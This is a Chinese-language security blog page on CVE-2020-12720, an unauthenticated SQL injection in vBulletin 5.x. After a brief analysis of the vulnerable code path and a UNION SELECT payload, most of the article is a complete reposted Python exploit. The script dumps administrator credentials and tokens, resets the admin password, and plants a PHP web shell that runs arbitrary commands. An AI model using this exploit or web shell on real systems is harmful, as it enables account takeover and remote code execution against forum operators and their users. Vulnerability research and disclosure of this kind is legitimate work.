<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2020-12720）vBulletin 未授权sql注入漏洞一、漏洞简介未经授权的用户可以通过SQL注入获取敏感数据 二、漏洞影响vBulletin 5.5.6pl1之前版本 vBulletin 5.6.0pl1之前的5.6.0版本 vBulletin 5.6.1pl1之前的5.6.1版本 三、复现过程漏洞分析漏洞文件：&#x2F;core&#x2F;vb&#x2F;library&#x2F;content.php">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/vBulletin/%EF%BC%88CVE-2020-12720%EF%BC%89vBulletin%20%20%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2020-12720）vBulletin 未授权sql注入漏洞一、漏洞简介未经授权的用户可以通过SQL注入获取敏感数据 二、漏洞影响vBulletin 5.5.6pl1之前版本 vBulletin 5.6.0pl1之前的5.6.0版本 vBulletin 5.6.1pl1之前的5.6.1版本 三、复现过程漏洞分析漏洞文件：&#x2F;core&#x2F;vb&#x2F;library&#x2F;content.php">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId33.png">
<meta property="article:published_time" content="2022-07-08T06:26:06.462Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.402Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-vBulletin/（CVE-2020-12720）vBulletin  未授权sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/vBulletin/%EF%BC%88CVE-2020-12720%EF%BC%89vBulletin%20%20%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:06.462Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-12720）vBulletin-未授权sql注入漏洞"><a href="#（CVE-2020-12720）vBulletin-未授权sql注入漏洞" class="headerlink" title="（CVE-2020-12720）vBulletin 未授权sql注入漏洞"></a>（CVE-2020-12720）vBulletin 未授权sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>未经授权的用户可以通过SQL注入获取敏感数据</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>vBulletin 5.5.6pl1之前版本</p>
<p>vBulletin 5.6.0pl1之前的5.6.0版本</p>
<p>vBulletin 5.6.1pl1之前的5.6.1版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞文件：/core/vb/library/content.php</p>
<p><img src="/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="下载.png"></p>
<p>跟进fillContentTableData方法，直接调用了getRow方法</p>
<p><img src="/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="下载
1.png"></p>
<p>此处getRow方法传入的第一个参数为&#39;vBForum:getContentTablesData&#39;，全局搜索getContentTablesData方法</p>
<p><img src="/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="下载
2.png"></p>
<p>nodeid被设置为常量TYPE_NOCLEAN的值，该值为0。</p>
<p>跟进cleanArray方法</p>
<p><img src="/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.png" alt="下载
3.png"></p>
<p>变量vartype经过数组处理后即为TYPE_NOCLEAN，随后调用doClean方法进行数据清洗</p>
<p><img src="/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.png" alt="下载
4.png"></p>
<p>doClean方法会根据传入的type数值进入到不同的分支进行处理，因为变量vartype为0直接进入到TYPE_NOCLEAN的分支，从而不做清洗处理。</p>
<p>再回到/core/packages/vbforum/db/mysql/querydefs.php文件中，发现后续并没有再对nodeid键值进行处理，直接拼接到SQL语句中，造成了SQL注入漏洞。</p>
<p><img src="/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.png" alt="下载
5.png"></p>
<p>至于如何利用，就不赘述了，向上追溯调用链即可。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code>nodeId[nodeid]=1 AND text.nodeid = 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,user(),19,20,21,22,23,24,25,26--
</code></pre>
<p><img src="/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.png" alt="1.png">打个断点就能快速定位漏洞点<img src="/resource/(CVE-2020-12720)vBulletin%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId33.png" alt="2.png"></p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>CVE-2020-12720.py
# Exploit Title: vBulletin 5.6.1 - &#39;nodeId&#39; SQL Injection
# Date: 2020-05-15
# Exploit Author: Photubias
# Vendor Advisory: [1] https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4440032-vbulletin-5-6-1-security-patch-level-1
# Version: vBulletin v5.6.x (prior to Patch Level 1)
# Tested on: vBulletin v5.6.1 on Debian 10 x64
# CVE: CVE-2020-12720 vBulletin v5.6.1 (SQLi) with path to RCE

#!/usr/bin/env python3
&#39;&#39;&#39;

    
    Copyright 2020 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
        
        File name CVE-2020-12720.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be

        This is a native implementation without requirements, written in Python 3.
        Works equally well on Windows as Linux (as MacOS, probably ;-)
        
        ##--&gt;&gt; Full creds to @zenofex and @rekter0 &lt;&lt;--##
&#39;&#39;&#39;
import urllib.request, urllib.parse, sys, http.cookiejar, ssl, random, string

## Static vars; change at will, but recommend leaving as is
sADMINPASS = &#39;12345678&#39;
sCMD = &#39;id&#39;
sURL = &#39;http://192.168.50.130/&#39;
sUSERID = &#39;1&#39;
sNEWPASS = &#39;87654321&#39;
iTimeout = 5

## Ignore unsigned certs
ssl._create_default_https_context = ssl._create_unverified_context

## Keep track of cookies between requests
cj = http.cookiejar.CookieJar()
oOpener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def randomString(stringLength=8):
    letters = string.ascii_lowercase
    return &#39;&#39;.join(random.choice(letters) for i in range(stringLength))

def getData(sUrl, lData):
    try:
        oData = urllib.parse.urlencode(lData).encode()
        oRequest = urllib.request.Request(url = sUrl, data = oData)
        return oOpener.open(oRequest, timeout = iTimeout)
    except:
        print(&#39;----- ERROR, site down?&#39;)
        sys.exit(1)

def verifyBug(sURL,sUserid=&#39;1&#39;):
    sPath = &#39;ajax/api/content_infraction/getIndexableContent&#39;
    lData = &#123;&#39;nodeId[nodeid]&#39; : &#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,&quot;cve-2020-12720&quot;,8,7,6,5,4,3,2,1;--&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    if not &#39;cve-2020-12720&#39; in sResponse:
        print(&#39;[!] Warning: not vulnerable to CVE-2020-12720, credentials are needed!&#39;)
        return False
    else:
        print(&#39;[+] SQLi Success!&#39;)
        return True

def takeoverAccount(sURL, sNEWPASS):
    sPath = &#39;ajax/api/content_infraction/getIndexableContent&#39;
    ### Source: https://github.com/rekter0/exploits/tree/master/CVE-2020-12720
    ## Get Table Prefixes
    lData = &#123;&#39;nodeId[nodeid]&#39; : &#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,table_name,8,7,6,5,4,3,2,1 from information_schema.columns WHERE column_name=\&#39;phrasegroup_cppermission\&#39;;--&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#39;rawtext&#39; in sResponse: sPrefix = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&#125;&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;language&#39;,&#39;&#39;)
    else: sPrefix = &#39;&#39;
    #print(&#39;[+] Got table prefix &quot;&#39;+sPrefix+&#39;&quot;&#39;)

    ## Get usergroup ID for &quot;Administrators&quot;
    lData = &#123;&#39;nodeId[nodeid]&#39; : &#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,usergroupid,8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;usergroup WHERE title=\&#39;Administrators\&#39;;--&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    sGroupID = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&#125;&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;)
    #print(&#39;[+] Administrators Group ID: &#39;+sGroupID)
    
    ## Get admin data, including original token (password hash), TODO: an advanced exploit could restore the original hash in post exploitation
    lData = &#123;&#39;nodeId[nodeid]&#39; : &#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,concat(username,0x7c,userid,0x7c,email,0x7c,token),8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;user where usergroupid=&#39; + sGroupID + &#39;;--&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    sUsername,sUserid,sUsermail,sUserTokenOrg = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&#125;&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;).split(&#39;|&#39;)
    #print(&#39;[+] Got original token (&#39; + sUsername + &#39;, &#39; + sUsermail + &#39;): &#39; + sUserTokenOrg)

    ## Let&#39;s create a Human Verify Captcha
    sPath = &#39;ajax/api/hv/generateToken?&#39;
    lData = &#123;&#39;securitytoken&#39;:&#39;guest&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#39;hash&#39; in sResponse: sHash = sResponse.split(&#39;hash&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&#125;&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;)
    else: sHash = &#39;&#39;

    ## Get the captcha answer from DB
    sPath = &#39;ajax/api/content_infraction/getIndexableContent&#39;
    lData = &#123;&#39;nodeId[nodeid]&#39;:&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,count(answer),8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;humanverify limit 0,1--&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#39;rawtext&#39; in sResponse: iAnswers = int(sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&#125;&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;))
    else: iAnswers = 1

    lData = &#123;&#39;nodeId[nodeid]&#39;:&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,answer,8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;humanverify limit &#39; + str(iAnswers-1) + &#39;,1--&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#39;rawtext&#39; in sResponse: sAnswer = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&#125;&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;)
    else: sAnswer = &#39;&#39;

    ## Now request PW reset and retrieve the token
    sPath = &#39;auth/lostpw&#39;
    lData = &#123;&#39;email&#39;:sUsermail,&#39;humanverify[input]&#39;:sAnswer,&#39;humanverify[hash]&#39;:sHash,&#39;securitytoken&#39;:&#39;guest&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    
    sPath = &#39;ajax/api/content_infraction/getIndexableContent&#39;
    lData = &#123;&#39;nodeId[nodeid]&#39;:&#39;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,activationid,8,7,6,5,4,3,2,1 from &#39; + sPrefix + &#39;useractivation WHERE userid=&#39; + sUserid + &#39; limit 0,1--&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#39;rawtext&#39; in sResponse: sToken = sResponse.split(&#39;rawtext&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&#125;&#39;,&#39;&#39;).replace(&#39;&quot;&#39;,&#39;&#39;)
    else: sToken = &#39;&#39;

    ## Finally the password reset itself
    sPath = &#39;auth/reset-password&#39;
    lData = &#123;&#39;userid&#39;:sUserid,&#39;activationid&#39;:sToken,&#39;new-password&#39;:sNEWPASS,&#39;new-password-confirm&#39;:sNEWPASS,&#39;securitytoken&#39;:&#39;guest&#39;&#125;
    sResponse = getData(sURL + sPath, lData).read().decode()
    if not &#39;Logging in&#39; in sResponse:
        print(&#39;[-] Failed to reset the password&#39;)
        return &#39;&#39;
    else:
        print(&#39;[+] Success! User &#39; + sUsername + &#39; now has password &#39; + sNEWPASS)
    return sUserid

def createBackdoor(sURL, sADMINPASS, sUserid=&#39;1&#39;):
    ## Activating Sitebuilder
    sPath = &#39;ajax/activate-sitebuilder&#39;
    lData = &#123;&#39;pageid&#39;:&#39;1&#39;, &#39;nodeid&#39;:&#39;0&#39;,&#39;userid&#39;:&#39;1&#39;,&#39;loadMenu&#39;:&#39;false&#39;, &#39;isAjaxTemplateRender&#39;:&#39;true&#39;, &#39;isAjaxTemplateRenderWithData&#39;:&#39;true&#39;,&#39;securitytoken&#39;:&#39;1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12&#39;&#125;
    oResponse = getData(sURL + sPath, lData)
    if not oResponse.code == 200:
        print(&#39;[-] Error activating sitebuilder&#39;)
        sys.exit(1)

    ## Confirming the password, getting new securitytoken
    sPath = &#39;auth/ajax-login&#39;
    lData = &#123;&#39;logintype&#39;:&#39;cplogin&#39;,&#39;userid&#39;:sUserid,&#39;password&#39;:sADMINPASS,&#39;securitytoken&#39;:&#39;1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12&#39;&#125;
    oResponse = getData(sURL + sPath, lData)
    sResponse = oResponse.read().decode()
    if &#39;lostpw&#39; in sResponse:
        print(&#39;[-] Error: authentication for userid &#39; + sUserid + &#39; failed&#39;)
        sys.exit(1)
    sToken = sResponse.split(&#39;,&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;&#125;&#39;,&#39;&#39;)
    print(&#39;[+] Got token: &#39;+sToken)

    ## cpsession is needed, use this for extra verification
    #for cookie in cj: print(cookie.name, cookie.value, cookie.domain) #etc etc

    ## First see if our backdoor does not already exists
    sPath = &#39;ajax/render/admin_sbpanel_pagelist_content_wrapper&#39;
    lData = &#123;&#39;isAjaxTemplateRenderWithData&#39;:&#39;true&#39;,&#39;securitytoken&#39;:sToken&#125;
    oResponse = getData(sURL + sPath, lData)
    sResponse = oResponse.read().decode()
    if &#39;cve-2020-12720&#39; in sResponse:
        sPageName = &#39;cve-2020-12720-&#39; + sResponse.split(&#39;/cve-2020-12720-&#39;)[1].split(&#39;)&#39;)[0]
        print(&#39;[+] This machine was already pwned, using &quot;&#39; + sPageName + &#39;&quot; for your command&#39;)
        return sPageName
    

    ## Create a new empty page
    sPath = &#39;ajax/api/widget/saveNewWidgetInstance&#39;
    lData = &#123;&#39;containerinstanceid&#39;:&#39;0&#39;,&#39;widgetid&#39;:&#39;23&#39;,&#39;pagetemplateid&#39;:&#39;&#39;,&#39;securitytoken&#39;:sToken&#125;
    oResponse = getData(sURL + sPath, lData)
    sResponse = oResponse.read().decode()
    sWidgetInstanceID = sResponse.split(&#39;,&#39;)[0].split(&#39;:&#39;)[1].replace(&#39;&#125;&#39;,&#39;&#39;)
    sPageTemplateID = sResponse.split(&#39;,&#39;)[1].split(&#39;:&#39;)[1].replace(&#39;&#125;&#39;,&#39;&#39;)
    print(&#39;[+] Got WidgetInstanceID: &#39;+sWidgetInstanceID+&#39; and PageTemplateID: &#39;+sPageTemplateID)

    ## Now submitting the page content
    sPageName = &#39;cve-2020-12720-&#39;+randomString()
    sPath = &#39;ajax/api/widget/saveAdminConfig&#39;
    lData = &#123;&#39;widgetid&#39;:&#39;23&#39;,
             &#39;pagetemplateid&#39;:sPageTemplateID,
             &#39;widgetinstanceid&#39;:sWidgetInstanceID,
             &#39;data[widget_type]&#39;:&#39;&#39;,
             &#39;data[title]&#39;:sPageName,
             &#39;data[show_at_breakpoints][desktop]&#39;:&#39;1&#39;,
             &#39;data[show_at_breakpoints][small]&#39;:&#39;1&#39;,
             &#39;data[show_at_breakpoints][xsmall]&#39;:&#39;1&#39;,
             &#39;data[hide_title]&#39;:&#39;0&#39;,
             &#39;data[module_viewpermissions][key]&#39;:&#39;show_all&#39;,
             &#39;data[code]&#39;:&quot;echo(&#39;###SHELLRESULT###&#39;);system($_GET[&#39;cmd&#39;]);echo(&#39;###SHELLRESULT###&#39;);&quot;,
             &#39;securitytoken&#39;:sToken&#125;
    oResponse = getData(sURL + sPath, lData)
    if not oResponse.code == 200: print(&#39;[!] Error submitting page content for &#39; + sPageName)
    
    ## Finally saving the new page
    sPath = &#39;admin/savepage&#39;
    lData = &#123;&#39;input[ishomeroute]&#39;:&#39;0&#39;,
             &#39;input[pageid]&#39;:&#39;0&#39;,
             &#39;input[nodeid]&#39;:&#39;0&#39;,
             &#39;input[userid]&#39;:&#39;1&#39;,
             &#39;input[screenlayoutid]&#39;:&#39;2&#39;,
             &#39;input[templatetitle]&#39;:sPageName,
             &#39;input[displaysections[0]]&#39;:&#39;[&#123;&quot;widgetId&quot;:&quot;23&quot;,&quot;widgetInstanceId&quot;:&quot;&#39; + sWidgetInstanceID + &#39;&quot;&#125;]&#39;,
             &#39;input[displaysections[1]]&#39;:&#39;[]&#39;,
             &#39;input[displaysections[2]]&#39;:&#39;[]&#39;,
             &#39;input[displaysections[3]]&#39;:&#39;[]&#39;,
             &#39;input[pagetitle]&#39;:sPageName,
             &#39;input[resturl]&#39;:sPageName,
             &#39;input[metadescription]&#39;:&#39;Photubias+Shell&#39;,
             &#39;input[pagetemplateid]&#39;:sPageTemplateID,
             &#39;url&#39;:sURL,
             &#39;securitytoken&#39;:sToken&#125;
    oResponse = getData(sURL + sPath, lData)
    if not oResponse.code == 200: print(&#39;[!] Error saving page content for &#39; + sPageName)
    return sPageName

def main():
    if len(sys.argv) == 1:
        print(&#39;[!] No arguments found: python3 CVE-2020-12720.py &lt;URL&gt; &lt;CMD&gt;&#39;)
        print(&#39;    Example: ./CVE-2020-12720.py http://192.168.50.130/ &quot;cat /etc/passwd&quot;&#39;)
        print(&#39;    But for now, ask questions then&#39;)
        sURL = input(&#39;[?] Please enter the address and path to vBulletin ([http://192.168.50.130/): &#39;)
        if sURL == &#39;&#39;: sURL = &#39;http://192.168.50.130&#39;
    else:
        sURL = sys.argv[1]
        sCMD = sys.argv[2]
    if not sURL[:-1] == &#39;/&#39;: sURL += &#39;/&#39;
    if not sURL[:4].lower() == &#39;http&#39;: sURL = &#39;http://&#39; + sURL
    print(&#39;[+] Welcome, first verifying the SQLi vulnerability&#39;)
    if verifyBug(sURL):
        print(&quot;----\n&quot; + &#39;[+] Attempting automatic admin account takeover&#39;)
        sUSERID = takeoverAccount(sURL, sNEWPASS)
        sADMINPASS = sNEWPASS
        if sUSERID == &#39;&#39;:
            sUSERID = &#39;1&#39;
            sADMINPASS = input(&#39;[?] Please enter the admin password (userid &#39; + sUSERID + &#39;): &#39;)
    else:
        sADMINPASS = input(&#39;[?] Please enter the admin password (userid &#39; + sUSERID + &#39;): &#39;)
    print(&quot;----\n&quot;+&#39;[+] So far so good, attempting the creation of the backdoor&#39;)
    sPageName = createBackdoor(sURL, sADMINPASS, sUSERID)

    if len(sys.argv) == 1: sCMD = input(&#39;[?] Please enter the command to run [id]: &#39;)
    if sCMD == &#39;&#39;: sCMD = &#39;id&#39;
    sCmd =  urllib.parse.quote(sCMD)
    sPath = sPageName + &quot;?cmd=&quot; + sCmd

    print(&#39;[+] Opening &#39;+sURL + sPath)
    try:
        oRequest = urllib.request.Request(url = sURL + sPath)
        oResponse = oOpener.open(oRequest, timeout = iTimeout)
        print(&#39;#######################&#39;)
        sResponse = oResponse.read().decode()
        print(&#39;[+] Command result:&#39;)
        print(sResponse.split(&#39;###SHELLRESULT###&#39;)[1])
    except:
        print(&#39;[-] Something went wrong, bad command?&#39;)
        sys.exit(1)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/U-MiFkBiY6fF44xfwAV-Ng">https://mp.weixin.qq.com/s/U-MiFkBiY6fF44xfwAV-Ng</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/vBulletin/%EF%BC%88CVE-2020-12720%EF%BC%89vBulletin%20%20%E6%9C%AA%E6%8E%88%E6%9D%83sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxje00kiy8v1azrl9itt" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Vmware%20vCenter/CVE-2021-21972%20vCenter%206.5-7.0%20RCE%20%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BPOC/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/vBulletin/%EF%BC%88CVE-2019-17132%EF%BC%89vBulletin%205.0%20_5.5.4-'updateAvatar'%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>